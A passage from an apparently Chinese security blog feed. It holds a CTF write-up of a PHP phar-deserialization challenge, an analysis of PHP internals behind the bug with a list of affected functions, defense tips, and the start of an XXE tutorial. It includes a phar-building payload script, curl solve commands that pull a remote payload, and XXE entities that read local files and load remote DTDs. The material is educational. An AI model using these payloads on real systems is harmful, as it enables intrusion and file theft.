   die(file_get_contents($path . &quot;/avatar.gif&quot;));    &#125;    $mode = $_GET[&quot;m&quot;];    if ($mode == &quot;upload&quot;)        upload(check_session());    else if ($mode == &quot;show&quot;)        show(check_session());    else        highlight_file(__FILE__);</code></pre><p>题目代码非常简短，关键点我已经在图中给出了注释，我下面就简单的分析一下这道题</p><p>这道题很明确就是一个反序列化的题，我们的目的就是通过反序列化 Admin 这个类得到我们的 flag 但是如果按照我们原先的思维，我们就可以直接放弃了，为啥？我们看一下 unserailize(）的部分</p><pre><code class="hljs"> function check_session() &#123;        global $SECRET;        $data = $_COOKIE[&quot;session-data&quot;];        list($data, $hmac) = explode(&quot;-----&quot;, $data, 2);        if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac))            die(&quot;Bye&quot;);        if ( !hash_equals(hash_hmac(&quot;sha1&quot;, $data, $SECRET), $hmac) )            die(&quot;Bye Bye&quot;);        $data = unserialize($data);        if ( !isset($data-&gt;avatar) )            die(&quot;Bye Bye Bye&quot;);        return $data-&gt;avatar;                                               //判断身份，如果身份正确返回头像路径(沙盒路径)                                                                            //该函数不可绕过    &#125;</code></pre><p>如果我们想利用 unserailize() ，通过控制其参数去实现我们的反序列化，我们就必须绕过对 cookie 的检测，那我们看一下 cookie 是怎么生成的</p><pre><code class="hljs"> $FLAG    = create_function(&quot;&quot;, &#39;die(`/read_flag`);&#39;);                    // 得到 flag 的匿名函数    $SECRET  = `/read_secret`;    $SANDBOX = &quot;/var/www/data/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);   // 根据 remote_addr 给每个人创建一个沙盒    @mkdir($SANDBOX);    @chdir($SANDBOX);    if (!isset($_COOKIE[&quot;session-data&quot;])) &#123;                        $data = serialize(new User($SANDBOX));        $hmac = hash_hmac(&quot;sha1&quot;, $data, $SECRET);        setcookie(&quot;session-data&quot;, sprintf(&quot;%s-----%s&quot;, $data, $hmac));      //将每个人唯一的沙盒对象加上签名后作为 session-data    &#125;</code></pre><p>很清楚 cookie 是通过 remote_addr 配合 sha1 进行 hmac 签名生成的，想绕过他那是不可能的，当时的人们肯定都是沉迷于无法绕过这个，于是最终这道题是 全球 0 解，但是现在我们就要思考一下 是不是能用 Phar 这个在不使用 unserialize() 的方式完成序列化成功 get flag  </p><p><strong>那么回顾一下使用 Phar 反序列化的条件是什么</strong></p><p>(1)文件上传点<br>(2)系统文件函数<br>(3) phar:&#x2F;&#x2F; 伪协议</p><p>然后我们就看到了这个函数</p><pre><code class="hljs">function upload($path) &#123;    $data = file_get_contents($_GET[&quot;url&quot;] . &quot;/avatar.gif&quot;);            //获取头像，检查头是否为GIF89a ，正确后存入沙盒                                                //这个就是利用 phar:// 进行反序列化的点    if (substr($data, 0, 6) !== &quot;GIF89a&quot;)        die(&quot;Fuck off&quot;);    file_put_contents($path . &quot;/avatar.gif&quot;, $data);    die(&quot;Upload OK&quot;);&#125;</code></pre><p>这个太完美了，完全符合我们要求，我们只要的精心构造一个包含 Admin 对象、包含 avatar.gif 文件，并且 stub 是 <code>GIF89a&lt;?php xxx; __HALT_COMPILER();?&gt;</code> 的 phar 文件然后上传上去，下一次请求通过 Phar:&#x2F;&#x2F; 协议让 file_get_contents 请求这个文件就可以实现我们对 Admin 对象的反序列化了(有人可能会说为什么不直接用 phar:&#x2F;&#x2F; 请求远程文件**，因为phar:&#x2F;&#x2F; 不支持访问远程 URL** )</p><p><strong>生成 phar 的 paylod</strong></p><pre><code class="hljs">&lt;?phpclass Admin &#123;public $avatar = &#39;orz&#39;;  &#125; $p = new Phar(__DIR__ . &#39;/avatar.phar&#39;, 0);$p[&#39;file.php&#39;] = &#39;&lt;?php ?&gt;&#39;;$p-&gt;setMetadata(new Admin());$p-&gt;setStub(&#39;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#39;);rename(__DIR__ . &#39;/avatar.phar&#39;, __DIR__ . &#39;/avatar.gif&#39;);?&gt;</code></pre><p>这里还有一个点需要提一下(虽然和反序列化没什么直接关系)，就是我们通过 eval 创建的函数并不能帮我们拿到 flag 因为他是随机名称的，我们是无法预测的，实际上这是 Orange 的一个障眼法，我们真正要利用的是 eval 下面的 <code> $_GET[&quot;lucky&quot;]();</code></p><p>但是实际上我们的 $FLAG 也是一个匿名函数，但是匿名函数就真的没有名字了吗？非也，匿名函数的函数名被定义为</p><pre><code class="hljs">\000_lambda_&quot; . count(anonymous_functions)++;</code></pre><p>这里的count 会一直递增到最大长度直到结束，这里我们可以通过大量的请求来迫使Pre-fork模式启动的Apache启动新的线程，这样这里的随机数会刷新为1，就可以预测了</p><p><strong>下面给出 Orange 的解题过程</strong></p><pre><code class="hljs"># get a cookie$ curl http://host/ --cookie-jar cookie# download .phar file from http://orange.tw/avatar.gif$ curl -b cookie &#39;http://host/?m=upload&amp;url=http://orange.tw/&#39;# force apache to fork new process$ python fork.py &amp;# get flag$ curl -b cookie &quot;http://host/?m=upload&amp;url=phar:///var/www/data/$MD5_IP/&amp;lucky=%00lambda_1&quot;</code></pre><h2 id="0X06-从-PHP-源码探索-phar-利用成功的深层原因"><a href="#0X06-从-PHP-源码探索-phar-利用成功的深层原因" class="headerlink" title="0X06 从 PHP 源码探索 phar 利用成功的深层原因"></a><strong>0X06 从 PHP 源码探索 phar 利用成功的深层原因</strong></h2><p>本文本来到上一个小结对PHP 反序列化的整个的分析就结束了，可我突然又想起来了前段时间看到了 @ZSX 大师傅的一片<a href="https://blog.zsxsoft.com/post/38?from=timeline&isappinstalled=0">文章</a>，于是打算从师父哪里学姿势，正好弥补一下我对 PHP 底层肤浅的认识,所以我们继续~~</p><h3 id="1-先介绍-PHP-流的概念"><a href="#1-先介绍-PHP-流的概念" class="headerlink" title="1.先介绍 PHP 流的概念"></a><strong>1.先介绍 PHP 流的概念</strong></h3><p>流的作用是在出发地和目的地之间传输数据。出发地和目的地可以是文件、命令行进程、网络连接、ZIP 或 TAR 压缩文件、临时内存、标准输入或输出，或者是通过 <strong>PHP 流封装协议</strong>实现的任何其他资源。</p><p>如果你读写过文件，就用过流；如果你从 php:&#x2F;&#x2F;stdin 读取过数据，或者把输入写入 php:&#x2F;&#x2F;stdout，也用过流。流为 PHP 的很多 IO 函数提供了底层实现，如 file_get_contents、fopn、fread 和 fwrite 等。<strong>PHP 的流函数提供了不同资源的统一接口。</strong></p><p>我们可以把流比作管道，把水（资源数据）从一个地方引到另一个地方。在水从出发地到目的地的过程中，我们可以过滤水，可以改变水质，可以添加水，也可以排出水。</p><h3 id="2-介绍流封装协议（wrapper）："><a href="#2-介绍流封装协议（wrapper）：" class="headerlink" title="2.介绍流封装协议（wrapper）："></a><strong>2.介绍流封装协议（wrapper）：</strong></h3><p>因为流式数据的种类各异，而每种类型需要独特的协议，以便读写数据，我们称这些协议为流封装协议。例如，我们可以读写文件系统，可以通过 HTTP、HTTPS 或 SSH 与远程 Web 服务器通信，还可以打开并读写 ZIP、RAR 或 PHAR 压缩文件</p><p>虽然过程是一样的，但是读写文件系统中文件的方式与收发 HTTP 消息的方式有所不同，流封装协议的作用是使用通用的接口封装这种差异。</p><p>每个流都有一个协议和一个目标。指定协议和目标的方法是使用流标识符：<code>&lt;scheme&gt;://&lt;target&gt;</code>，其中 <code>&lt;scheme&gt;</code> 是流的封装协议，<code>&lt;target&gt;</code> 是流的数据源。</p><h4 id="http-流封装协议"><a href="#http-流封装协议" class="headerlink" title="http:&#x2F;&#x2F;流封装协议"></a><strong>http:&#x2F;&#x2F;流封装协议</strong></h4><p>下面使用 HTTP 流封装协议创建了一个与 Flicker API 通信的 PHP 流：</p><pre><code class="hljs">&lt;?php$json = file_get_contents(    &#39;http://api.flickr.com/services/feeds/photos_public.gne?format=json&#39;);</code></pre><p>不要以为这是普通的网页 URL，file_get_contents() 函数的字符串参数其实是一个流标识符。http 协议会让 PHP 使用 HTTP 流封装协议，在这个参数中，http 之后是流的目标。</p><blockquote><p>注：很多 PHP 开发者可能并不知道普通的 URL 其实是 PHP 流封装协议标识符的伪装。</p></blockquote><h4 id="file-流封装协议"><a href="#file-流封装协议" class="headerlink" title="file:&#x2F;&#x2F;流封装协议"></a><strong>file:&#x2F;&#x2F;流封装协议</strong></h4><p>我们通常使用 file_get_contents()、fopen()、fwrite() 和 fclose() 等函数读写文件系统，<strong>因为 PHP 默认使用的流封装协议是 file:&#x2F;&#x2F;</strong>，所以我们很少认为这些函数使用的是 PHP 流。下面的示例演示了使用 file:&#x2F;&#x2F; 流封装协议创建一个读写 &#x2F;etc&#x2F;hosts 文件的流：</p><pre><code class="hljs">&lt;?php$handle = fopen(&#39;file:///etc/hosts&#39;, &#39;rb&#39;);while (feof($handle) !== TRUE) &#123;        echo fgets($handle);&#125;fclose($handle);</code></pre><p><strong>我们通常会省略掉 file:&#x2F;&#x2F; 协议，因为这是 PHP 使用的默认值。</strong></p><p>这两段介绍来源于<a href="https://laravelacademy.org/post/7459.html%EF%BC%8C%E9%82%A3%E4%B9%88%E8%BF%99%E4%B8%AA%E8%AF%B4%E6%98%8E%E4%BA%86%E4%B8%80%E4%B8%AA%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98%E5%91%A2%EF%BC%9F%E8%AF%B4%E6%98%8E%E6%88%91%E4%BB%ACPHP">https://laravelacademy.org/post/7459.html，那么这个说明了一个什么问题呢？说明我们PHP</a> 目前的几乎所有的 I&#x2F;O 操作都是通过流配合流包装器来实现的，<strong>因为 PHP 默认的包装器就是 file:&#x2F;&#x2F;</strong>  ，虽然你没写，但是底层 PHP 还是通过流包装器实现的。</p><h4 id="还有更多"><a href="#还有更多" class="headerlink" title="还有更多"></a><strong>还有更多</strong></h4><p>使用  <strong>stream_get_wrappers()</strong> 获取当前系统注册的全部 wrapper</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%9C%89%E5%93%AA%E4%BA%9B%20wrappers.png" alt="此处输入图片的描述"></p><h3 id="3-开始向下挖掘："><a href="#3-开始向下挖掘：" class="headerlink" title="3.开始向下挖掘："></a><strong>3.开始向下挖掘：</strong></h3><p>我们上面说了，phar 文件中存在我们可控的序列化的内容，然后我们又说，这个内容在 文件系统函数 配合 phar:&#x2F;&#x2F; 的时候能实现反序列化，但是我们没说为什么，这也就是我们这节讨论的重点，所有的原因都能从源代码找到答案</p><h4 id="1-先看一下-Phar-文件源代码部分"><a href="#1-先看一下-Phar-文件源代码部分" class="headerlink" title="(1)先看一下 Phar 文件源代码部分"></a><strong>(1)先看一下 Phar 文件源代码部分</strong></h4><p>因为 Phar 是 PHP 的一个扩展，于是我们在 GitHub 的 php-src&#x2F;ext&#x2F;phar&#x2F;phar.c 去全局搜索 <a href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618">unserailize()</a> 函数</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Phar%20%E6%96%87%E4%BB%B6%E6%BA%90%E7%A0%81.png" alt="此处输入图片的描述"></p><h4 id="2-但是这个函数为什么能调用呢"><a href="#2-但是这个函数为什么能调用呢" class="headerlink" title="(2)但是这个函数为什么能调用呢"></a><strong>(2)但是这个函数为什么能调用呢</strong></h4><p>这就涉及到了文件系统函数的部分了，我们找一下源码，位置在 Github php-src&#x2F;ext&#x2F;standard&#x2F;file.c<br>这个文件包含了非常多的文件函数的实现，我们先全局搜索 <a href="https://github.com/php/php-src/blob/PHP-7.2.11/ext/standard/file.c#L519">file_get_contents</a></p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/file_get_contents.png" alt="此处输入图片的描述"></p><p>然后我们稍微往下翻翻就能发现和<a href="https://github.com/php/php-src/blob/PHP-7.2.11/ext/standard/file.c#L550">处理 wrapper 流相关的函数</a> </p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/open_wrapper.png" alt="此处输入图片的描述"></p><p>我们发现了这个 php)stream_open_wrapper_ex 这个函数能处理我们的 wrapper ，那么其他的类似的函数是不是也是底层调用了这个函数呢？</p><h4 id="3-由此及彼"><a href="#3-由此及彼" class="headerlink" title="(3)由此及彼"></a><strong>(3)由此及彼</strong></h4><p>我们全局搜索一下 <a href="https://github.com/php/php-src/blob/master/ext/standard/file.c#L871">fopen()</a>，然后我们看一下具体的实现</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/fopen%20%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0.png" alt="此处输入图片的描述"></p><p>是不是很熟悉？这下好了，我们不如把 PHP 源码下载下来，来一个真正的全局搜索</p><h4 id="4-举一反三"><a href="#4-举一反三" class="headerlink" title="(4)举一反三"></a><strong>(4)举一反三</strong></h4><p>我本地使用 sublime text 对整个 PHP 源码进行了扫描，发现了很多很多地方调用了这个函数，其实并不只是我们常见的 文件系统函数</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/php%20%E6%BA%90%E7%A0%81%E5%85%A8%E5%B1%80%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C.png" alt="此处输入图片的描述"></p><p>而这些截图只是整个影响面的冰山一角</p><h4 id="5-收集整理"><a href="#5-收集整理" class="headerlink" title="(5)收集整理"></a><strong>(5)收集整理</strong></h4><h5 id="1-hash"><a href="#1-hash" class="headerlink" title="1.hash"></a><strong>1.hash</strong></h5><p><a href="https://github.com/php/php-src/blob/master/ext/hash/hash.c#L263">(1)hash_file()</a><br><a href="https://github.com/php/php-src/blob/master/ext/hash/hash.c#L494">(2)hash_update_file()</a></p><h5 id="2-MySQL"><a href="#2-MySQL" class="headerlink" title="2.MySQL"></a><strong><a href="https://github.com/php/php-src/blob/master/ext/mysqlnd/mysqlnd_loaddata.c#L52">2.MySQL</a></strong></h5><pre><code class="hljs">mysqlnd_local_infile_init</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/mysqlnd.png" alt="此处输入图片的描述"></p><h5 id="3-file"><a href="#3-file" class="headerlink" title="3.file"></a><strong>3.file</strong></h5><p>这里只是对 file 的补充</p><p><a href="https://github.com/php/php-src/blob/master/ext/standard/file.c#L1401">(1)readfile()</a><br><a href="https://github.com/php/php-src/blob/master/ext/standard/filestat.c#L675">(2)touch</a><br><a href="https://github.com/php/php-src/blob/master/ext/standard/file.c#L400">(3)get_meta_tags()</a><br><a href="https://github.com/php/php-src/blob/master/ext/standard/file.c#L758">(4)file()</a></p><h5 id="4-PDO-postgresql"><a href="#4-PDO-postgresql" class="headerlink" title="4.PDO::postgresql"></a><strong><a href="https://github.com/php/php-src/blob/master/ext/pdo_pgsql/pgsql_driver.c#L674">4.PDO::postgresql</a></strong></h5><pre><code class="hljs">PDO::pgsqlCopyFromFile(string $table_name , string $filename [, string $delimiter [, string $null_as ] [, string $fields])</code></pre><h5 id="5-URL"><a href="#5-URL" class="headerlink" title="5.URL"></a><strong><a href="https://github.com/php/php-src/blob/master/ext/standard/url.c#L682">5.URL</a></strong></h5><p>fetches all the headers sent by the server in response to a HTTP request </p><pre><code class="hljs">get_headers(string url[, int format[, resource context]])</code></pre><h5 id="6-zlib"><a href="#6-zlib" class="headerlink" title="6.zlib"></a><strong><a href="https://github.com/php/php-src/blob/master/ext/zlib/zlib_fopen_wrapper.c#L131">6.zlib</a></strong></h5><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/zlib.png" alt="此处输入图片的描述"></p><h5 id="7-libxml"><a href="#7-libxml" class="headerlink" title="7.libxml"></a><strong><a href="https://github.com/php/php-src/blob/master/ext/libxml/libxml.c#L357">7.libxml</a></strong></h5><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/libxml.png" alt="此处输入图片的描述"></p><h5 id="8-fileinfo"><a href="#8-fileinfo" class="headerlink" title="8.fileinfo"></a><strong><a href="https://github.com/php/php-src/blob/master/ext/fileinfo/fileinfo.c#L553">8.fileinfo</a></strong></h5><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/fileinfo.png" alt="此处输入图片的描述"></p><p>这些只是我找到的一些，还有一些在 <a href="https://blog.zsxsoft.com/post/38?from=timeline&isappinstalled=0">https://blog.zsxsoft.com/post/38?from=timeline&amp;isappinstalled=0</a></p><h4 id="6-简单测试"><a href="#6-简单测试" class="headerlink" title="(6)简单测试"></a><strong>(6)简单测试</strong></h4><p>这里我就挑选最最有趣的做一个测试</p><p>zlib 这个非常有意思，他的实现意味着我们能在 compress.zlib:&#x2F;&#x2F; 后面添加我们的 phar 语句，也就是说如果禁止了开头使用  phar:&#x2F;&#x2F; 我们就能用这种方法绕过</p><p><strong>测试代码：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/zlib%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%811.png" alt="此处输入图片的描述"></p><p><strong>结果如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/zlib%20%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C1.png" alt="此处输入图片的描述"></p><p>当然，这些还远远不够，在<a href="https://files.ripstech.com/slides/PHP.RUHR_2018_New_PHP_Exploitation_Techniques.pdf">这片文章</a>中列举了非常多与之有关的函数</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phar_another1.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phar_another2.png" alt="此处输入图片的描述"></p><p>除此之外就是 zsx 师傅<a href="https://xz.aliyun.com/t/2958#toc-9">找到的</a>，我没有仔细看重合的部分，读者想发觉自己看一下吧</p><h2 id="0X07-防御方法："><a href="#0X07-防御方法：" class="headerlink" title="0X07 防御方法："></a><strong>0X07 防御方法：</strong></h2><p>1.严格的把控 unserailize() 函数的参数，不要给攻击者任何输入的可能<br>2.在文件系统函数的参数可控时，对参数进行严格的过滤。<br>3.严格检查上传文件的内容，而不是只检查文件头。<br>4.在条件允许的情况下禁用可执行系统命令、代码的危险函数。</p><h2 id="0X08-总结"><a href="#0X08-总结" class="headerlink" title="0X08 总结"></a><strong>0X08 总结</strong></h2><p>本文结合我对 PHP 反序列化的理解以及参考文章的分析，详细地一步一个脚印地分析了 什么是PHP 反序列化，PHP 反序列化有什么意义, 攻击者是如何利用 PHP 反序列化的漏洞进行攻击的，并详细分析了通用的攻击思路与攻击手段，对 Phar 对 PHP 反序列化的扩展也做了详细的讨论，特别是补充的从底层分析漏洞来源并扩展攻击面很值得我们思考(感谢ZSX 大佬的分享，利用这个知识点我也出了 LCTF 2018 的一道 web 题，我从中也学到了很多，当然由于水平有限，这一部分分析可能不到位，请大家见谅)，我还在在最后给出了简单的防御 PHP 反序列化的几条建议，希望读者在看完我的文章以后有与众不同的的收获，这将是我莫大的荣幸。</p><h2 id="0X08-参考"><a href="#0X08-参考" class="headerlink" title="0X08 参考"></a><strong>0X08 参考</strong></h2><p><a href="http://www.freebuf.com/articles/web/167721.html">http://www.freebuf.com/articles/web/167721.html</a><br><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a><br><a href="http://paper.tuisec.win/detail/fa497a4e50b5d83">http://paper.tuisec.win/detail/fa497a4e50b5d83</a><br><a href="http://www.blogsir.com.cn/safe/452.html">http://www.blogsir.com.cn/safe/452.html</a><br><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html</a><br><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a><br><a href="https://www.lorexxar.cn/2017/11/10/hitcon2017-writeup/">https://www.lorexxar.cn/2017/11/10/hitcon2017-writeup/</a><br><a href="http://www.freebuf.com/column/161798.html">http://www.freebuf.com/column/161798.html</a><br><a href="https://www.anquanke.com/post/id/84922">https://www.anquanke.com/post/id/84922</a><br><a href="https://github.com/80vul/phpcodz">https://github.com/80vul/phpcodz</a><br><a href="http://www.venenof.com/index.php/archives/565/">http://www.venenof.com/index.php/archives/565/</a><br><a href="http://www.blogsir.com.cn/safe/452.html">http://www.blogsir.com.cn/safe/452.html</a><br><a href="http://www.laruence.com/2010/06/20/1602.html">http://www.laruence.com/2010/06/20/1602.html</a><br><a href="https://blog.zsxsoft.com/post/38?from=timeline&isappinstalled=0">https://blog.zsxsoft.com/post/38?from=timeline&amp;isappinstalled=0</a><br><a href="https://laravelacademy.org/post/7459.html">https://laravelacademy.org/post/7459.html</a><br><a href="https://blog.csdn.net/tuantuanls/article/details/28445877?utm_source=itdadao&utm_medium=referral">https://blog.csdn.net/tuantuanls/article/details/28445877?utm_source=itdadao&amp;utm_medium=referral</a><br><a href="http://www.php.net/manual/en/book.stream.php">http://www.php.net/manual/en/book.stream.php</a><br><a href="https://blog.csdn.net/gb4215287/article/details/78134445">https://blog.csdn.net/gb4215287/article/details/78134445</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全 漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一篇文章带你理解漏洞之 XXE 漏洞</title>
    <link href="/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/"/>
    <url>/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="一、XXE-是什么"><a href="#一、XXE-是什么" class="headerlink" title="一、XXE 是什么"></a><strong>一、XXE 是什么</strong></h2><p>介绍 XXE 之前，我先来说一下普通的 XML 注入，这个的利用面比较狭窄，如果有的话应该也是逻辑漏洞</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/xml%E6%B3%A8%E5%85%A5.png" alt="此处输入图片的描述"></p><p>既然能插入 XML 代码，那我们肯定不能善罢甘休，我们需要更多，于是出现了 XXE</p><p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是什么？XML外部实体。(看到这里肯定有人要说：你这不是在废话)，固然，其实我这里废话只是想强调我们的利用点是 <strong>外部实体</strong> ，也是提醒读者将注意力集中于外部实体中，而不要被 XML 中其他的一些名字相似的东西扰乱了思维(<strong>盯好外部实体就行了</strong>)，如果能注入 外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面（这可能就是为什么单独说 而没有说 XML 注入的原因吧，或许普通的 XML 注入真的太鸡肋了，现实中几乎用不到）</p><span id="more"></span><h2 id="二、简单介绍一下背景知识："><a href="#二、简单介绍一下背景知识：" class="headerlink" title="二、简单介绍一下背景知识："></a><strong>二、简单介绍一下背景知识：</strong></h2><p>XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，…），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。</p><p>在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。 外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。 但是，在处理外部实体时，可以针对应用程序启动许多攻击。 这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。 通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。</p><h2 id="三、基础知识"><a href="#三、基础知识" class="headerlink" title="三、基础知识"></a><strong>三、基础知识</strong></h2><p>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的，他就是长得下面这个样子</p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?xml version=&quot;1.0&quot;?&gt;//这一行是 XML 文档定义&lt;!DOCTYPE message [&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;&lt;!ELEMENT receiver (#PCDATA)&gt;&lt;!ELEMENT sender (#PCDATA)&gt;&lt;!ELEMENT header (#PCDATA)&gt;&lt;!ELEMENT msg (#PCDATA)&gt;</code></pre><p>上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写 </p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;message&gt;&lt;receiver&gt;Myself&lt;/receiver&gt;&lt;sender&gt;Someone&lt;/sender&gt;&lt;header&gt;TheReminder&lt;/header&gt;&lt;msg&gt;This is an amazing book&lt;/msg&gt;&lt;/message&gt;</code></pre><p>其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 ML 中除了能标签以外，还需要有些内容是固定的</p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</code></pre><p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p><h3 id="重点来了："><a href="#重点来了：" class="headerlink" title="重点来了："></a><strong>重点来了：</strong></h3><p><strong>重点一：</strong></p><p>实体分为两种，内部实体和<strong>外部实体</strong>，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：</p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;&lt;creds&gt;    &lt;user&gt;&amp;xxe;&lt;/user&gt;    &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（<strong>方便永远是安全的敌人</strong>）</p><p>当然，还有一种引用方式是使用 引用<strong>公用 DTD</strong> 的方法，语法如下：</p><pre><code class="hljs">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</code></pre><p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</p><p><strong>重点二：</strong></p><p>我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体），别晕。。</p><p><strong>1.通用实体</strong></p><p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用</p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; ]&gt; &lt;updateProfile&gt;      &lt;firstname&gt;Joe&lt;/firstname&gt;      &lt;lastname&gt;&amp;file;&lt;/lastname&gt;      ... &lt;/updateProfile&gt;</code></pre><p><strong>2.参数实体：</strong></p><p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; &lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; %an-element; %remote-dtd;</code></pre><p><strong>抛转：</strong></p><p>参数实体在我们 Blind XXE 中起到了至关重要的作用</p><h2 id="四、我们能做什么"><a href="#四、我们能做什么" class="headerlink" title="四、我们能做什么"></a><strong>四、我们能做什么</strong></h2><p>上一节疯狂暗示了 <strong>外部实体</strong> ，那他究竟能干什么？</p><p>实际上，当你看到下面这段代码的时候，有一点安全意识的小伙伴应该隐隐约约能觉察出什么</p><pre><code class="hljs">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; 